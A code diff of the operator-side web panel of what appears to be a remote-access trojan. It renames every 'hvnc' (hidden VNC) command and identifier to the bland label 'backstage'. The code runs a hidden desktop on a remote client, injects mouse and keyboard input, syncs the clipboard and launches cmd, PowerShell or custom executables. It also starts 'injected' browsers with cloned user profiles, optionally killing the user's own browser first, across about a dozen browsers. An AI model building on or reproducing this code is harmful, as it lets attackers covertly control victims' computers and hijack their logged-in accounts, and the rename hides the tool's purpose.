@@ -16,7 +16,7 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
   // for older bookmarked URLs.
   const virtualMode = ["virtual", "hidden"].includes(urlParams.get("mode"));
 
-  const allowed = await checkFeatureAccess("hvnc", clientId);
+  const allowed = await checkFeatureAccess("backstage", clientId);
   if (!allowed) return;
 
   const clientLabel = document.getElementById("clientLabel");
@@ -46,7 +46,7 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
       location.host +
       "/api/clients/" +
       clientId +
-      "/hvnc/ws";
+      "/backstage/ws";
   }
 
   function connectWs() {
@@ -90,14 +90,14 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
   const webrtcVideo = document.getElementById("webrtcVideo");
   const canvas = document.getElementById("frameCanvas");
   const canvasContainer = document.getElementById("canvasContainer");
-  const contextMenu = document.getElementById("hvncContextMenu");
+  const contextMenu = document.getElementById("backstageContextMenu");
   const ctx = canvas.getContext("2d");
   const agentFps = document.getElementById("agentFps");
   const viewerFps = document.getElementById("viewerFps");
   const statusEl = document.getElementById("streamStatus");
   const clipboardSyncCtrl = document.getElementById("clipboardSyncCtrl");
   const uiaCtrl = document.getElementById("uiaCtrl");
-  const hvncResolutionSelect = document.getElementById("hvncResolutionSelect");
+  const backstageResolutionSelect = document.getElementById("backstageResolutionSelect");
   const targetFpsSelect = document.getElementById("targetFpsSelect");
   let whepClient = null;
   let p2pClient = null;
@@ -108,10 +108,10 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
   }
 
   function syncInputEnableState() {
-    if (mouseCtrl) sendCmd("hvnc_enable_mouse", { enabled: mouseCtrl.checked });
-    if (kbdCtrl) sendCmd("hvnc_enable_keyboard", { enabled: kbdCtrl.checked });
-    if (uiaCtrl) sendCmd("hvnc_enable_uia", { enabled: uiaCtrl.checked });
-    pushHvncResolution();
+    if (mouseCtrl) sendCmd("backstage_enable_mouse", { enabled: mouseCtrl.checked });
+    if (kbdCtrl) sendCmd("backstage_enable_keyboard", { enabled: kbdCtrl.checked });
+    if (uiaCtrl) sendCmd("backstage_enable_uia", { enabled: uiaCtrl.checked });
+    pushbackstageResolution();
   }
   let activeClientId = clientId;
   let renderCount = 0;
@@ -158,7 +158,7 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
   function applySharedSettings(settings) {
     if (!settings || typeof settings !== "object") return;
     savedDisplay = Number.isFinite(Number(settings.display)) ? Number(settings.display) : savedDisplay;
-    setSelectValue(hvncResolutionSelect, settings.resolution);
+    setSelectValue(backstageResolutionSelect, settings.resolution);
     setSelectValue(targetFpsSelect, settings.targetFps);
     setSelectValue(webrtcMode, settings.webrtcMode);
     if (qualitySlider && settings.quality !== undefined) qualitySlider.value = String(settings.quality);
@@ -169,9 +169,9 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
     if (typeof settings.preferH264 === "boolean") {
       prefersH264 = settings.preferH264 && typeof VideoDecoder === "function";
     }
-    const cloneToggle = document.getElementById("hvncCloneToggle");
-    const cloneLiteToggle = document.getElementById("hvncCloneLiteToggle");
-    const killIfRunningToggle = document.getElementById("hvncKillIfRunningToggle");
+    const cloneToggle = document.getElementById("backstageCloneToggle");
+    const cloneLiteToggle = document.getElementById("backstageCloneLiteToggle");
+    const killIfRunningToggle = document.getElementById("backstageKillIfRunningToggle");
     if (cloneToggle && typeof settings.cloneProfile === "boolean") cloneToggle.checked = settings.cloneProfile;
     if (cloneLiteToggle && typeof settings.cloneLite === "boolean") cloneLiteToggle.checked = settings.cloneLite;
     if (killIfRunningToggle && typeof settings.killIfRunning === "boolean") {
@@ -183,7 +183,7 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
   function readSharedSettings() {
     return {
       display: Number(displaySelect?.value || 0),
-      resolution: hvncResolutionSelect?.value || "1080",
+      resolution: backstageResolutionSelect?.value || "1080",
       targetFps: Number(targetFpsSelect?.value || 120),
       quality: Number(qualitySlider?.value || 90),
       preferH264: !!prefersH264,
@@ -192,14 +192,14 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
       keyboard: !!kbdCtrl?.checked,
       clipboardSync: !!clipboardSyncCtrl?.checked,
       uia: !!uiaCtrl?.checked,
-      cloneProfile: document.getElementById("hvncCloneToggle")?.checked !== false,
-      cloneLite: document.getElementById("hvncCloneLiteToggle")?.checked === true,
-      killIfRunning: document.getElementById("hvncKillIfRunningToggle")?.checked === true,
+      cloneProfile: document.getElementById("backstageCloneToggle")?.checked !== false,
+      cloneLite: document.getElementById("backstageCloneLiteToggle")?.checked === true,
+      killIfRunning: document.getElementById("backstageKillIfRunningToggle")?.checked === true,
     };
   }
 
-  applySharedSettings(await loadSharedUiSettings("hvnc"));
-  const sharedSettingsSaver = createSharedUiSettingsSaver("hvnc", readSharedSettings);
+  applySharedSettings(await loadSharedUiSettings("backstage"));
+  const sharedSettingsSaver = createSharedUiSettingsSaver("backstage", readSharedSettings);
 
   if (codecH264) {
     codecH264.checked = prefersH264;
@@ -382,12 +382,12 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
         setStreamState("starting", "Reconnecting");
         const mode = getWebrtcMode();
         if (displaySelect && displaySelect.value !== undefined) {
-          sendCmd("hvnc_select_display", {
+          sendCmd("backstage_select_display", {
             display: parseInt(displaySelect.value, 10) || 0,
           });
         }
         pushTargetFps();
-        sendCmd("hvnc_start", {
+        sendCmd("backstage_start", {
           autoStartExplorer: false,
           webrtc: mode === "relayed",
           ...(virtualMode ? { virtual_mode: true, hidden_mode: true } : {}),
@@ -538,9 +538,9 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
     }
   }
 
-  function handleHVNCError(msg) {
-    const errorText = msg.error || msg.message || "Unknown HVNC error";
-    console.error("hvnc: server error:", errorText);
+  function handlebackstageError(msg) {
+    const errorText = msg.error || msg.message || "Unknown backstage error";
+    console.error("backstage: server error:", errorText);
     if (!launchStatusEl) return;
     if (launchHideTimer) {
       clearTimeout(launchHideTimer);
@@ -580,7 +580,7 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
   }
 
   function requestBrowserCheck() {
-    sendCmd("hvnc_browser_check", {});
+    sendCmd("backstage_browser_check", {});
   }
 
   const installedAppsLoading = document.getElementById("installedAppsLoading");
@@ -604,7 +604,7 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
     if (installedAppsGrid) installedAppsGrid.innerHTML = "";
     if (installedAppsCount) installedAppsCount.textContent = "";
     if (installedAppsEmpty) installedAppsEmpty.classList.add("hidden");
-    sendCmd("hvnc_installed_apps", {});
+    sendCmd("backstage_installed_apps", {});
   }
 
   function applyInstalledAppsFilter() {
@@ -742,7 +742,7 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
     btn.appendChild(nameSpan);
 
     btn.addEventListener("click", () => {
-      sendCmd("hvnc_start_process", { path: '"' + app.exePath + '"' });
+      sendCmd("backstage_start_process", { path: '"' + app.exePath + '"' });
       hideContextMenu();
     });
     installedAppsGrid.appendChild(btn);
@@ -763,7 +763,7 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
       return;
     }
     const msg = { type, ...payload };
-    console.debug("hvnc: send", msg);
+    console.debug("backstage: send", msg);
     ws.send(encodeMsgpack(msg));
   }
 
@@ -774,7 +774,7 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
   }
 
   function onWebrtcState(label, state) {
-    console.debug(`hvnc webrtc[${label}]: state`, state);
+    console.debug(`backstage webrtc[${label}]: state`, state);
     if (state === "connected") {
       setStreamState("streaming", `Streaming (${label})`);
     } else if (state === "failed" || state === "disconnected") {
@@ -829,7 +829,7 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
       setWebrtcViewActive(true);
       startWebrtcFrameTicker();
     } catch (err) {
-      console.warn("hvnc webrtc: WHEP start failed, falling back to canvas", err);
+      console.warn("backstage webrtc: WHEP start failed, falling back to canvas", err);
       setWebrtcViewActive(false);
       whepClient = null;
     }
@@ -852,7 +852,7 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
       setWebrtcViewActive(true);
       startWebrtcFrameTicker();
     } catch (err) {
-      console.warn("hvnc webrtc: P2P start failed, falling back to canvas", err);
+      console.warn("backstage webrtc: P2P start failed, falling back to canvas", err);
       setWebrtcViewActive(false);
       const client = p2pClient;
       p2pClient = null;
@@ -917,9 +917,9 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
   function pushQuality(val) {
     const q = Number(val) || 90;
     const codec = q >= 100 ? "raw" : (prefersH264 ? "h264" : "jpeg");
-    console.debug("hvnc: pushQuality val=", val, "q=", q, "codec=", codec);
+    console.debug("backstage: pushQuality val=", val, "q=", q, "codec=", codec);
     setCodecModeLabel(codec, "requested");
-    sendCmd("hvnc_set_quality", { quality: q, codec });
+    sendCmd("backstage_set_quality", { quality: q, codec });
   }
 
   function selectedTargetFps() {
@@ -928,7 +928,7 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
   }
 
   function pushTargetFps() {
-    sendCmd("hvnc_set_fps", { fps: selectedTargetFps() });
+    sendCmd("backstage_set_fps", { fps: selectedTargetFps() });
   }
 
   if (targetFpsSelect) {
@@ -942,7 +942,7 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
     if (mode === "relayed" || mode === "p2p") {
       const q = Number(qualitySlider?.value) || 90;
       setCodecModeLabel("h264", "webrtc");
-      sendCmd("hvnc_set_quality", { quality: q, codec: "h264", source: "webrtc" });
+      sendCmd("backstage_set_quality", { quality: q, codec: "h264", source: "webrtc" });
       return;
     }
     if (qualitySlider) {
@@ -980,11 +980,11 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
     prefersH264 = false;
     destroyVideoDecoder();
     if (codecH264) codecH264.checked = false;
-    console.warn("hvnc: falling back to jpeg codec", reason || "", "errors:", h264ErrorCount);
+    console.warn("backstage: falling back to jpeg codec", reason || "", "errors:", h264ErrorCount);
     const q = Number(qualitySlider?.value) || 90;
     setCodecModeLabel("jpeg", "fallback");
     if (ws && ws.readyState === WebSocket.OPEN) {
-      sendCmd("hvnc_set_quality", { quality: q, codec: "jpeg" });
+      sendCmd("backstage_set_quality", { quality: q, codec: "jpeg" });
     }
     if (h264ErrorCount <= 3 && typeof VideoDecoder === "function") {
       if (h264RetryTimer) clearTimeout(h264RetryTimer);
@@ -1046,21 +1046,21 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
           }
         },
         error: (err) => {
-          console.warn("hvnc: h264 decoder error", err);
+          console.warn("backstage: h264 decoder error", err);
         },
       });
       videoDecoder.configure({ codec: "avc1.42E01E", optimizeForLatency: true });
       return true;
     } catch (err) {
-      console.warn("hvnc: h264 decoder unavailable", err);
+      console.warn("backstage: h264 decoder unavailable", err);
       fallbackToJpegCodec(err);
       return false;
     }
   }
 
   displaySelect.addEventListener("change", function () {
-    console.debug("hvnc: select display", displaySelect.value);
-    sendCmd("hvnc_select_display", {
+    console.debug("backstage: select display", displaySelect.value);
+    sendCmd("backstage_select_display", {
       display: parseInt(displaySelect.value, 10),
     });
     sharedSettingsSaver.scheduleSave();
@@ -1076,7 +1076,7 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
   startBtn.addEventListener("click", function () {
     const mode = getWebrtcMode();
     if (displaySelect && displaySelect.value !== undefined) {
-      sendCmd("hvnc_select_display", {
+      sendCmd("backstage_select_display", {
         display: parseInt(displaySelect.value, 10) || 0,
       });
     }
@@ -1085,7 +1085,7 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
     desiredStreaming = true;
     lastFrameAt = 0;
     setStreamState("starting", "Starting stream");
-    sendCmd("hvnc_start", {
+    sendCmd("backstage_start", {
       autoStartExplorer: false,
       webrtc: mode === "relayed",
       ...(virtualMode ? { virtual_mode: true, hidden_mode: true } : {}),
@@ -1096,12 +1096,12 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
   stopBtn.addEventListener("click", function () {
     desiredStreaming = false;
     setStreamState("stopping", "Stopping stream");
-    sendCmd("hvnc_stop", {});
+    sendCmd("backstage_stop", {});
     stopAllWebrtc();
   });
   if (killAllBtn) {
     killAllBtn.addEventListener("click", function () {
-      sendCmd("hvnc_kill_all", {});
+      sendCmd("backstage_kill_all", {});
     });
   }
   fullscreenBtn.addEventListener("click", function () {
@@ -1114,29 +1114,29 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
     }
   });
   mouseCtrl.addEventListener("change", function () {
-    sendCmd("hvnc_enable_mouse", { enabled: mouseCtrl.checked });
+    sendCmd("backstage_enable_mouse", { enabled: mouseCtrl.checked });
     sharedSettingsSaver.scheduleSave();
   });
   kbdCtrl.addEventListener("change", function () {
-    sendCmd("hvnc_enable_keyboard", { enabled: kbdCtrl.checked });
+    sendCmd("backstage_enable_keyboard", { enabled: kbdCtrl.checked });
     sharedSettingsSaver.scheduleSave();
   });
   if (uiaCtrl) {
     uiaCtrl.addEventListener("change", function () {
-      sendCmd("hvnc_enable_uia", { enabled: uiaCtrl.checked });
+      sendCmd("backstage_enable_uia", { enabled: uiaCtrl.checked });
       sharedSettingsSaver.scheduleSave();
     });
   }
 
-  function pushHvncResolution() {
-    if (hvncResolutionSelect) {
-      const maxHeight = parseInt(hvncResolutionSelect.value, 10);
-      sendCmd("hvnc_set_resolution", { maxHeight: maxHeight });
+  function pushbackstageResolution() {
+    if (backstageResolutionSelect) {
+      const maxHeight = parseInt(backstageResolutionSelect.value, 10);
+      sendCmd("backstage_set_resolution", { maxHeight: maxHeight });
     }
   }
-  if (hvncResolutionSelect) {
-    hvncResolutionSelect.addEventListener("change", function () {
-      pushHvncResolution();
+  if (backstageResolutionSelect) {
+    backstageResolutionSelect.addEventListener("change", function () {
+      pushbackstageResolution();
       sharedSettingsSaver.scheduleSave();
     });
   }
@@ -1234,7 +1234,7 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
         hasCanvasBase = false;
       }
       if (blockCount > 0 && !hasCanvasBase) {
-        sendCmd("hvnc_request_keyframe", { reason: "viewer_missing_base" });
+        sendCmd("backstage_request_keyframe", { reason: "viewer_missing_base" });
         return;
       }
 
@@ -1285,7 +1285,7 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
         videoDecoder.decode(chunk);
         updateFpsDisplay(fps);
       } catch (err) {
-        console.warn("hvnc: h264 decode failed", err);
+        console.warn("backstage: h264 decode failed", err);
         fallbackToJpegCodec(err);
       }
     }
@@ -1329,36 +1329,36 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
         if (p2pClient) p2pClient.onRemoteCandidate(msg);
         return;
       }
-      if (msg && msg.type === "hvnc_clone_progress") {
+      if (msg && msg.type === "backstage_clone_progress") {
         handleCloneProgress(msg);
         return;
       }
-      if (msg && msg.type === "hvnc_lookup_result") {
+      if (msg && msg.type === "backstage_lookup_result") {
         handleLookupResult(msg);
         return;
       }
-      if (msg && msg.type === "hvnc_browser_check_result") {
+      if (msg && msg.type === "backstage_browser_check_result") {
         handleBrowserCheckResult(msg);
         return;
       }
-      if (msg && msg.type === "hvnc_installed_apps_result") {
+      if (msg && msg.type === "backstage_installed_apps_result") {
         handleInstalledAppsResult(msg);
         return;
       }
-      if (msg && msg.type === "hvnc_dxgi_status") {
+      if (msg && msg.type === "backstage_dxgi_status") {
         handleDXGIStatus(msg);
         return;
       }
-      if (msg && msg.type === "hvnc_browser_launch_status") {
+      if (msg && msg.type === "backstage_browser_launch_status") {
         handleBrowserLaunchStatus(msg);
         return;
       }
-      if (msg && msg.type === "hvnc_window_list_result") {
+      if (msg && msg.type === "backstage_window_list_result") {
         handleWindowListResult(msg);
         return;
       }
-      if (msg && msg.type === "hvnc_error") {
-        handleHVNCError(msg);
+      if (msg && msg.type === "backstage_error") {
+        handlebackstageError(msg);
         return;
       }
       if (msg && msg.type === "clipboard_content") {
@@ -1388,32 +1388,32 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
       if (p2pClient) p2pClient.onRemoteCandidate(msg);
       return;
     }
-    if (msg && msg.type === "hvnc_clone_progress") {
+    if (msg && msg.type === "backstage_clone_progress") {
       handleCloneProgress(msg);
       return;
     }
-    if (msg && msg.type === "hvnc_lookup_result") {
+    if (msg && msg.type === "backstage_lookup_result") {
       handleLookupResult(msg);
       return;
     }
-    if (msg && msg.type === "hvnc_browser_check_result") {
+    if (msg && msg.type === "backstage_browser_check_result") {
       handleBrowserCheckResult(msg);
       return;
     }
-    if (msg && msg.type === "hvnc_installed_apps_result") {
+    if (msg && msg.type === "backstage_installed_apps_result") {
       handleInstalledAppsResult(msg);
       return;
     }
-    if (msg && msg.type === "hvnc_dxgi_status") {
+    if (msg && msg.type === "backstage_dxgi_status") {
       handleDXGIStatus(msg);
       return;
     }
-    if (msg && msg.type === "hvnc_browser_launch_status") {
+    if (msg && msg.type === "backstage_browser_launch_status") {
       handleBrowserLaunchStatus(msg);
       return;
     }
-    if (msg && msg.type === "hvnc_error") {
-      console.error("hvnc: server error:", msg.error || msg.message);
+    if (msg && msg.type === "backstage_error") {
+      console.error("backstage: server error:", msg.error || msg.message);
       return;
     }
     if (msg && msg.type === "clipboard_content") {
@@ -1433,10 +1433,10 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
       setStreamState("starting", "Resuming stream");
       const mode = getWebrtcMode();
       if (displaySelect && displaySelect.value !== undefined) {
-        sendCmd("hvnc_select_display", { display: parseInt(displaySelect.value, 10) || 0 });
+        sendCmd("backstage_select_display", { display: parseInt(displaySelect.value, 10) || 0 });
       }
       pushTargetFps();
-      sendCmd("hvnc_start", { autoStartExplorer: false, webrtc: mode === "relayed", ...(virtualMode ? { virtual_mode: true, hidden_mode: true } : {}) });
+      sendCmd("backstage_start", { autoStartExplorer: false, webrtc: mode === "relayed", ...(virtualMode ? { virtual_mode: true, hidden_mode: true } : {}) });
       if (mode === "p2p") startP2P();
       syncInputEnableState();
     } else {
@@ -1444,7 +1444,7 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
     }
     fetchClientInfo().then(() => {
       if (displaySelect && displaySelect.value) {
-        sendCmd("hvnc_select_display", { display: parseInt(displaySelect.value, 10) });
+        sendCmd("backstage_select_display", { display: parseInt(displaySelect.value, 10) });
       }
     });
     requestBrowserCheck();
@@ -1513,7 +1513,7 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
     }
     lastMoveSentAt = now;
     if (ws.bufferedAmount <= inputBackpressureBytes) {
-      sendCmd("hvnc_mouse_move", pendingMove);
+      sendCmd("backstage_mouse_move", pendingMove);
     }
   }
 
@@ -1533,10 +1533,10 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
     if (pt) {
       pendingMove = pt;
       if (ws.bufferedAmount <= inputBackpressureBytes) {
-        sendCmd("hvnc_mouse_move", pt);
+        sendCmd("backstage_mouse_move", pt);
       }
     }
-    sendCmd("hvnc_mouse_down", { button: e.button, ...(pt || {}) });
+    sendCmd("backstage_mouse_down", { button: e.button, ...(pt || {}) });
     e.preventDefault();
   });
   canvas.addEventListener("mouseup", function (e) {
@@ -1545,10 +1545,10 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
     if (pt) {
       pendingMove = pt;
       if (ws.bufferedAmount <= inputBackpressureBytes) {
-        sendCmd("hvnc_mouse_move", pt);
+        sendCmd("backstage_mouse_move", pt);
       }
     }
-    sendCmd("hvnc_mouse_up", { button: e.button, ...(pt || {}) });
+    sendCmd("backstage_mouse_up", { button: e.button, ...(pt || {}) });
     e.preventDefault();
   });
   canvas.addEventListener("contextmenu", function (e) {
@@ -1560,7 +1560,7 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
     const pt = getCanvasPoint(e);
     if (!pt) return;
     const delta = Math.max(-120, Math.min(120, Math.round(-e.deltaY)));
-    sendCmd("hvnc_mouse_wheel", { delta, x: pt.x, y: pt.y });
+    sendCmd("backstage_mouse_wheel", { delta, x: pt.x, y: pt.y });
     e.preventDefault();
   }, { passive: false });
 
@@ -1570,8 +1570,8 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
   });
   const kbdCapture = createKeyboardCapture({
     container: canvas,
-    sendKeyDown: (e) => sendCmd("hvnc_key_down", { key: e.key, code: e.code }),
-    sendKeyUp: (e) => sendCmd("hvnc_key_up", { key: e.key, code: e.code }),
+    sendKeyDown: (e) => sendCmd("backstage_key_down", { key: e.key, code: e.code }),
+    sendKeyUp: (e) => sendCmd("backstage_key_up", { key: e.key, code: e.code }),
   });
   if (kbdCtrl) {
     kbdCtrl.addEventListener("change", function () {
@@ -1591,7 +1591,7 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
     sharedSettingsSaver.saveNow();
     if (ws && ws.readyState === WebSocket.OPEN && desiredStreaming) {
       desiredStreaming = false;
-      sendCmd("hvnc_stop", {});
+      sendCmd("backstage_stop", {});
     }
     destroyVideoDecoder();
     stopAllWebrtc();
@@ -1631,7 +1631,7 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
     });
   }
 
-  ["hvncCloneToggle", "hvncCloneLiteToggle", "hvncKillIfRunningToggle"].forEach((id) => {
+  ["backstageCloneToggle", "backstageCloneLiteToggle", "backstageKillIfRunningToggle"].forEach((id) => {
     const el = document.getElementById(id);
     if (el) {
       el.addEventListener("change", function () {
@@ -1645,59 +1645,59 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
       item.addEventListener("click", (e) => {
         const action = e.currentTarget?.dataset?.action;
         if (action === "start-cmd") {
-          sendCmd("hvnc_start_process", { path: "conhost cmd.exe" });
+          sendCmd("backstage_start_process", { path: "conhost cmd.exe" });
         } else if (action === "start-powershell") {
-          sendCmd("hvnc_start_process", { path: "conhost powershell.exe" });
+          sendCmd("backstage_start_process", { path: "conhost powershell.exe" });
         } else if (action === "start-chrome") {
-          const clone = document.getElementById("hvncCloneToggle")?.checked !== false;
-          const cloneLite = document.getElementById("hvncCloneLiteToggle")?.checked === true;
-          const killIfRunning = document.getElementById("hvncKillIfRunningToggle")?.checked !== false;
-          sendCmd("hvnc_start_browser_injected", { browser: "chrome", clone, cloneLite, killIfRunning });
+          const clone = document.getElementById("backstageCloneToggle")?.checked !== false;
+          const cloneLite = document.getElementById("backstageCloneLiteToggle")?.checked === true;
+          const killIfRunning = document.getElementById("backstageKillIfRunningToggle")?.checked !== false;
+          sendCmd("backstage_start_browser_injected", { browser: "chrome", clone, cloneLite, killIfRunning });
         } else if (action === "start-brave") {
-          const clone = document.getElementById("hvncCloneToggle")?.checked !== false;
-          const cloneLite = document.getElementById("hvncCloneLiteToggle")?.checked === true;
-          const killIfRunning = document.getElementById("hvncKillIfRunningToggle")?.checked !== false;
-          sendCmd("hvnc_start_browser_injected", { browser: "brave", clone, cloneLite, killIfRunning });
+          const clone = document.getElementById("backstageCloneToggle")?.checked !== false;
+          const cloneLite = document.getElementById("backstageCloneLiteToggle")?.checked === true;
+          const killIfRunning = document.getElementById("backstageKillIfRunningToggle")?.checked !== false;
+          sendCmd("backstage_start_browser_injected", { browser: "brave", clone, cloneLite, killIfRunning });
         } else if (action === "start-edge") {
-          const clone = document.getElementById("hvncCloneToggle")?.checked !== false;
-          const cloneLite = document.getElementById("hvncCloneLiteToggle")?.checked === true;
-          const killIfRunning = document.getElementById("hvncKillIfRunningToggle")?.checked !== false;
-          sendCmd("hvnc_start_browser_injected", { browser: "edge", clone, cloneLite, killIfRunning });
+          const clone = document.getElementById("backstageCloneToggle")?.checked !== false;
+          const cloneLite = document.getElementById("backstageCloneLiteToggle")?.checked === true;
+          const killIfRunning = document.getElementById("backstageKillIfRunningToggle")?.checked !== false;
+          sendCmd("backstage_start_browser_injected", { browser: "edge", clone, cloneLite, killIfRunning });
         } else if (action === "start-firefox") {
-          const clone = document.getElementById("hvncCloneToggle")?.checked !== false;
-          const cloneLite = document.getElementById("hvncCloneLiteToggle")?.checked === true;
-          const killIfRunning = document.getElementById("hvncKillIfRunningToggle")?.checked !== false;
-          sendCmd("hvnc_start_browser_injected", { browser: "firefox", clone, cloneLite, killIfRunning });
+          const clone = document.getElementById("backstageCloneToggle")?.checked !== false;
+          const cloneLite = document.getElementById("backstageCloneLiteToggle")?.checked === true;
+          const killIfRunning = document.getElementById("backstageKillIfRunningToggle")?.checked !== false;
+          sendCmd("backstage_start_browser_injected", { browser: "firefox", clone, cloneLite, killIfRunning });
         } else if (action === "start-opera") {
-          const clone = document.getElementById("hvncCloneToggle")?.checked !== false;
-          const cloneLite = document.getElementById("hvncCloneLiteToggle")?.checked === true;
-          const killIfRunning = document.getElementById("hvncKillIfRunningToggle")?.checked !== false;
-          sendCmd("hvnc_start_browser_injected", { browser: "opera", clone, cloneLite, killIfRunning });
+          const clone = document.getElementById("backstageCloneToggle")?.checked !== false;
+          const cloneLite = document.getElementById("backstageCloneLiteToggle")?.checked === true;
+          const killIfRunning = document.getElementById("backstageKillIfRunningToggle")?.checked !== false;
+          sendCmd("backstage_start_browser_injected", { browser: "opera", clone, cloneLite, killIfRunning });
         } else if (action === "start-operagx") {
-          const clone = document.getElementById("hvncCloneToggle")?.checked !== false;
-          const cloneLite = document.getElementById("hvncCloneLiteToggle")?.checked === true;
-          const killIfRunning = document.getElementById("hvncKillIfRunningToggle")?.checked !== false;
-          sendCmd("hvnc_start_browser_injected", { browser: "operagx", clone, cloneLite, killIfRunning });
+          const clone = document.getElementById("backstageCloneToggle")?.checked !== false;
+          const cloneLite = document.getElementById("backstageCloneLiteToggle")?.checked === true;
+          const killIfRunning = document.getElementById("backstageKillIfRunningToggle")?.checked !== false;
+          sendCmd("backstage_start_browser_injected", { browser: "operagx", clone, cloneLite, killIfRunning });
         } else if (action === "start-vivaldi") {
-          const clone = document.getElementById("hvncCloneToggle")?.checked !== false;
-          const cloneLite = document.getElementById("hvncCloneLiteToggle")?.checked === true;
-          const killIfRunning = document.getElementById("hvncKillIfRunningToggle")?.checked !== false;
-          sendCmd("hvnc_start_browser_injected", { browser: "vivaldi", clone, cloneLite, killIfRunning });
+          const clone = document.getElementById("backstageCloneToggle")?.checked !== false;
+          const cloneLite = document.getElementById("backstageCloneLiteToggle")?.checked === true;
+          const killIfRunning = document.getElementById("backstageKillIfRunningToggle")?.checked !== false;
+          sendCmd("backstage_start_browser_injected", { browser: "vivaldi", clone, cloneLite, killIfRunning });
         } else if (action === "start-yandex") {
-          const clone = document.getElementById("hvncCloneToggle")?.checked !== false;
-          const cloneLite = document.getElementById("hvncCloneLiteToggle")?.checked === true;
-          const killIfRunning = document.getElementById("hvncKillIfRunningToggle")?.checked !== false;
-          sendCmd("hvnc_start_browser_injected", { browser: "yandex", clone, cloneLite, killIfRunning });
+          const clone = document.getElementById("backstageCloneToggle")?.checked !== false;
+          const cloneLite = document.getElementById("backstageCloneLiteToggle")?.checked === true;
+          const killIfRunning = document.getElementById("backstageKillIfRunningToggle")?.checked !== false;
+          sendCmd("backstage_start_browser_injected", { browser: "yandex", clone, cloneLite, killIfRunning });
         } else if (action === "start-waterfox") {
-          const clone = document.getElementById("hvncCloneToggle")?.checked !== false;
-          const cloneLite = document.getElementById("hvncCloneLiteToggle")?.checked === true;
-          const killIfRunning = document.getElementById("hvncKillIfRunningToggle")?.checked !== false;
-          sendCmd("hvnc_start_browser_injected", { browser: "waterfox", clone, cloneLite, killIfRunning });
+          const clone = document.getElementById("backstageCloneToggle")?.checked !== false;
+          const cloneLite = document.getElementById("backstageCloneLiteToggle")?.checked === true;
+          const killIfRunning = document.getElementById("backstageKillIfRunningToggle")?.checked !== false;
+          sendCmd("backstage_start_browser_injected", { browser: "waterfox", clone, cloneLite, killIfRunning });
         } else if (action === "start-arc") {
-          const clone = document.getElementById("hvncCloneToggle")?.checked !== false;
-          const cloneLite = document.getElementById("hvncCloneLiteToggle")?.checked === true;
-          const killIfRunning = document.getElementById("hvncKillIfRunningToggle")?.checked !== false;
-          sendCmd("hvnc_start_browser_injected", { browser: "arc", clone, cloneLite, killIfRunning });
+          const clone = document.getElementById("backstageCloneToggle")?.checked !== false;
+          const cloneLite = document.getElementById("backstageCloneLiteToggle")?.checked === true;
+          const killIfRunning = document.getElementById("backstageKillIfRunningToggle")?.checked !== false;
+          sendCmd("backstage_start_browser_injected", { browser: "arc", clone, cloneLite, killIfRunning });
         } else if (action === "start-custom") {
           hideContextMenu();
           showCustomExeModal();
@@ -1713,47 +1713,47 @@ import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-s
   }
 
   function showCustomExeModal() {
-    let overlay = document.getElementById("hvncCustomExeOverlay");
+    let overlay = document.getElementById("backstageCustomExeOverlay");
     if (overlay) { overlay.remove(); }
     overlay = document.createElement("div");
-    overlay.id = "hvncCustomExeOverlay";
+    overlay.id = "backstageCustomExeOverlay";
     overlay.className = "fixed inset-0 z-[100] flex items-center justify-center bg-black/60";
     overlay.innerHTML = `
       <div class="bg-slate-900 border border-slate-700 rounded-xl p-5 w-96 shadow-2xl">
         <div class="text-sm font-semibold text-slate-100 mb-3">Run Custom Executable</div>
